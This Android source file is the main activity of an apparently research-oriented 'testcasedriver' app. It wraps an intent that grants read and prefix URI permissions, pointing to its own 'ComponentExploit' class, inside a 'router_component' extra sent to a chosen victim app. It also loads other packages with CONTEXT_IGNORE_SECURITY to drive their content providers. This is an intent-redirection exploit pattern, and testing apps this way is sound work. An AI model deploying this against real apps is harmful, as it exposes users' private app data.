package app.swag.testcasedriver;

import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Bundle;

import androidx.appcompat.app.AppCompatActivity;

import app.swag.testcasedriver.contentprovider.ContentProviderDriver;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        Intent intent = getIntent();
        if (intent.hasExtra("className")){
            Intent routerIntent = new Intent();
            routerIntent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
            routerIntent.addFlags(Intent.FLAG_GRANT_PREFIX_URI_PERMISSION);
            routerIntent.setClassName("app.swag.testcasedriver","app.swag.testcasedriver.ComponentExploit");
//            routerIntent.setClassName(intent.getStringExtra("packageName"), intent.getStringExtra("className"));
            routerIntent.setData(Uri.parse(intent.getStringExtra("uri1")));

            Intent mIntent = new Intent();
            mIntent.putExtra("router_component", routerIntent);
            mIntent.setClassName(intent.getStringExtra("packageName"), intent.getStringExtra("className"));
            startActivity(mIntent);
        }
        else{
            Context cont = getApplicationContext();
            try {
                cont = createPackageContext(intent.getStringExtra("packageName"),CONTEXT_IGNORE_SECURITY);
            } catch (PackageManager.NameNotFoundException e) {
                e.printStackTrace();
            }

            new ContentProviderDriver().run(cont, intent.getStringExtra("uri1"));
        }
    }
}